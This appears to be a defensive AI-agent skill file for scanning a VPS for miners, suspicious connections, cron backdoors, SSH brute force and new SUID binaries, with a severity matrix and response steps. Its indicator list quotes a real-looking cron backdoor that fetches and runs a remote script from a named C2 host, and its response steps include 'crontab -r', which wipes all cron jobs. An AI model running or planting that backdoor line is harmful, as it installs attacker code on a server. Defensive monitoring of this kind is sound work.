---
name: security-monitoring
category: security
description: Automated security scanning and threat detection for VPS backend
triggers:
  - security scan
  - ตรวจความปลอดภัย
  - malware check
  - log audit
  - เช็คระบบ
  - threat detect
---

# Security Monitoring Skill

## Quick Security Scan (5-minute routine)

Run this when user asks "เช็คความปลอดภัย" or on cron schedule.

### Step 1: Process Check
```bash
ps aux --sort=-%cpu | head -20
```
Flag: xmrig, minerd, cryptonight, node (with unusual args), python/node running from /tmp

### Step 2: Network Connections
```bash
ss -tunapl | grep ESTAB
netstat -anp | grep ESTABLISHED | grep -v "127.0.0.1\|172.17\|:22 \|:443 \|:8080 "
```
Flag: Unknown foreign IPs, unusual high ports, connections to minio.daviduwu.ovh

### Step 3: Cron Jobs Audit
```bash
cat /var/spool/cron/crontabs/root 2>/dev/null
ls -la /etc/cron.d/ /etc/cron.daily/ 2>/dev/null
crontab -l 2>/dev/null
```
Flag: curl/wget from unknown URLs, base64 encoded commands, check.sh references

### Step 4: Failed SSH Logins
```bash
journalctl -u ssh --since "24 hours ago" | grep -i "failed\|invalid\|breakin" | tail -20
```
Flag: >10 failures from same IP = potential brute force

### Step 5: New SUID Files
```bash
find /usr -type f -perm -4000 2>/dev/null | sort > /tmp/suid-baseline.txt
diff /tmp/suid-baseline.txt /root/.security/suid-baseline.txt 2>/dev/null
```
Flag: Any new SUID binaries

## Threat Severity Matrix

| Level | Examples | Response |
|-------|----------|----------|
| LOW | 1-2 failed SSH, unknown but benign process | Log only |
| MEDIUM | Repeated cron anomalies, suspicious network | Log + escalate |
| HIGH | Known malware patterns, brute force confirmed | Telegram alert |
| CRITICAL | xmrig/crypto miner, active C2, data exfil | Alert + auto-block |

## Emergency Response

If CRITICAL found:
1. Block malicious IP: `iptables -A INPUT -s <IP> -j DROP`
2. Kill malware process: `pkill -f <malware_name>`
3. Remove malicious cron: `crontab -r` or edit /etc/cron.d/
4. Log to /var/log/security-incident.log with full evidence
5. Telegram alert to user

## Known IOCs (from previous incident)

- C2: minio.daviduwu.ovh
- Malware paths: /tmp/xmrig/, /tmp/node-index/
- Cron backdoor: */5 * * * * bash <(curl -s https://minio.daviduwu.ovh/public/check.sh)
- Attacker process names: xmrig, node (disguised), mysql-govern (fake MySQL)

## Agent Setup

This skill runs on the `security` Hermes profile — a dedicated agent with:
- Profile: `hermes profile create security`
- Persona: `/root/.hermes/profiles/security/SOUL.md` (vigilant Blue Team agent)
- Telegram bot: @CyberSecureVPS_bot
- Watchdog: included in `/usr/local/bin/gateway-watchdog.sh` PROFILES array

See `multi-agent-hermes-setup/references/new-agent-creation.md` for full creation steps.

## Automated Scanning (cron)

Set up a recurring security scan via Hermes cronjob:

```
cronjob action=create
schedule: every 2h
prompt: "Run a full security scan using the security-monitoring skill. Check processes, network, cron, SSH logs, SUID files. Report only if findings are MEDIUM or above. Stay SILENT if all clear."
skills: [security-monitoring]
```

Key: SILENT when clean — only alert on MEDIUM/HIGH/CRITICAL findings. User hates notification spam.
